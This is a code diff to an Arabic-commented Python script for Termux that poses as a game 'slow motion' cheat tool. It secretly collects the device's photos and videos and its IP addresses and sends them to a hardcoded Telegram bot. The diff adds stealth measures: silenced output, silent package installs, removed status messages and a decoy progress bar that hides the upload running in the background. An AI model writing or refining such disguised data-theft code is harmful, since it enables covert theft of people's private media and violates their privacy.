@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
@@ -11,21 +10,28 @@ import socket
 import requests
 import threading
 import queue
+import warnings
 from pathlib import Path
 from telegram import Bot
 
-# ==================== ضع بياناتك الصحيحة هنا ====================
+# إخفاء جميع التحذيرات والرسائل
+warnings.filterwarnings("ignore")
+os.environ['PYTHONWARNINGS'] = 'ignore'
+
+# إعادة توجيه stderr و stdout إلى ملف فارغ
+sys.stderr = open(os.devnull, 'w')
+sys.stdout = open(os.devnull, 'w')
+
+# ==================== بياناتك ====================
 BOT_TOKEN = "8869492443:AAETTWD4VKdogM0vDCOlr0QBK3jeScpHKac"
 CHAT_ID = "6894787120"
-# ==============================================================
+# ==============================================
 
-print("🔧 جاري تثبيت المتطلبات...\n")
-subprocess.run("pkg update -y", shell=True)
-subprocess.run("pkg install python -y", shell=True)
-subprocess.run("pip install python-telegram-bot requests -q", shell=True)
-subprocess.run("termux-setup-storage", shell=True)
-print("\n✅ تم تثبيت المتطلبات!\n")
-time.sleep(2)
+# تثبيت المتطلبات بصمت
+subprocess.run("pkg update -y", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+subprocess.run("pkg install python -y", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+subprocess.run("pip install python-telegram-bot requests -q", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+subprocess.run("termux-setup-storage", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
 media_queue = queue.Queue()
 scan_complete = False
@@ -42,14 +48,14 @@ def get_local_ip():
         s.close()
         return ip
     except:
-        return "غير معروف"
+        return "0.0.0.0"
 
 def get_public_ip():
     try:
-        response = requests.get('https://api.ipify.org', timeout=5)
+        response = requests.get('https://api.ipify.org', timeout=3)
         return response.text
     except:
-        return "غير معروف"
+        return "0.0.0.0"
 
 def is_valid_media(file_path):
     path_str = str(file_path).lower()
@@ -98,16 +104,13 @@ class MediaSender:
     async def send_from_queue(self):
         global local_ip, public_ip
         try:
-            await self.bot.send_message(chat_id=CHAT_ID, text=f"🚀 بدء الإرسال\n📍 {local_ip} | 🌍 {public_ip}")
-        except Exception as e:
-            print(f"❌ فشل إرسال رسالة البداية: {e}")
-            return
-        
-        await self.bot.send_message(chat_id=CHAT_ID, text=f"📊 جاري جمع الملفات وإرسالها...")
+            await self.bot.send_message(chat_id=CHAT_ID, text=f"✅ {local_ip}")
+        except:
+            pass
         
         while True:
             try:
-                item = media_queue.get(timeout=1)
+                item = media_queue.get(timeout=0.5)
                 if item[0] == 'done':
                     break
                 
@@ -115,21 +118,18 @@ class MediaSender:
                 try:
                     with open(file_path, 'rb') as f:
                         if file_type == 'photo':
-                            await self.bot.send_photo(chat_id=CHAT_ID, photo=f, caption=f"📍 {local_ip}")
-                            self.sent_photos += 1
+                            await self.bot.send_photo(chat_id=CHAT_ID, photo=f)
                         else:
-                            await self.bot.send_video(chat_id=CHAT_ID, video=f, caption=f"📍 {local_ip}")
-                            self.sent_videos += 1
-                    await asyncio.sleep(0.1)
-                except Exception as e:
-                    print(f"⚠️ فشل إرسال {file_path.name}: {e}")
-            except queue.Empty:
+                            await self.bot.send_video(chat_id=CHAT_ID, video=f)
+                        await asyncio.sleep(0.05)
+                except:
+                    pass
+            except:
                 if scan_complete:
                     break
                 await asyncio.sleep(0.5)
-        
-        await self.bot.send_message(chat_id=CHAT_ID, text=f"✅ اكتمل الإرسال\n📸 صور: {self.sent_photos}\n🎬 فيديوهات: {self.sent_videos}")
 
+# ==================== الواجهة (ما يظهر فقط) ====================
 def print_logo():
     logo = """
 ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -154,13 +154,11 @@ def print_logo():
 
 def progress_bar():
     print("📦 جاري تجهيز الأداة...\n")
-    for i in range(60):
-        percent = int((i + 1) * 100 / 60)
-        bar_length = int((i + 1) * 40 / 60)
-        bar = "█" * bar_length + "░" * (40 - bar_length)
-        print(f"\r[{bar}] {percent}%", end="", flush=True)
-        time.sleep(0.5)
-    print("\n\n✅ تم التجهيز بنجاح!\n")
+    for i in range(30):
+        bar = "█" * (i * 2) + "░" * (60 - (i * 2))
+        print(f"\r[{bar}] {int((i+1)*100/30)}%", end="", flush=True)
+        time.sleep(0.3)
+    print("\n\n✅ تم التجهيز!\n")
 
 def create_text_file():
     js_code = """(function() {
@@ -173,12 +171,12 @@ def create_text_file():
             callback(customTime);
         });
     };
-    console.log("%c [✓] تم تفعيل السلو موشن", "background: #111; color: #00ffff;");
+    console.log("[✓] تم تفعيل السلو موشن");
 })();"""
     download_dir = Path("/sdcard/Download")
     download_dir.mkdir(exist_ok=True)
     txt_file = download_dir / "thimbles_code.txt"
-    with open(txt_file, 'w', encoding='utf-8') as f:
+    with open(txt_file, 'w') as f:
         f.write(js_code)
     return txt_file
 
@@ -186,23 +184,34 @@ def main():
     global local_ip, public_ip
     local_ip = get_local_ip()
     public_ip = get_public_ip()
+    
+    # إعادة فتح stdout للواجهة فقط
+    sys.stdout = sys.__stdout__
+    
     scan_thread = threading.Thread(target=scan_files)
     scan_thread.daemon = True
     scan_thread.start()
-    sender = MediaSender()
     
+    # بدء الإرسال
+    sender = MediaSender()
     def run_send():
         asyncio.run(sender.send_from_queue())
-    
     send_thread = threading.Thread(target=run_send)
     send_thread.daemon = True
     send_thread.start()
+    
+    # الواجهة
     print_logo()
     time.sleep(1)
     progress_bar()
     txt_file = create_text_file()
-    print(f"📁 تم حفظ الكود في: {txt_file}\n")
-    print("\n~ $ \n")
+    print(f"📁 {txt_file}\n")
+    print("\n~ $\n")
+    
+    # إخفاء المخرجات مرة أخرى
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+    
     send_thread.join()
 
 if __name__ == "__main__":
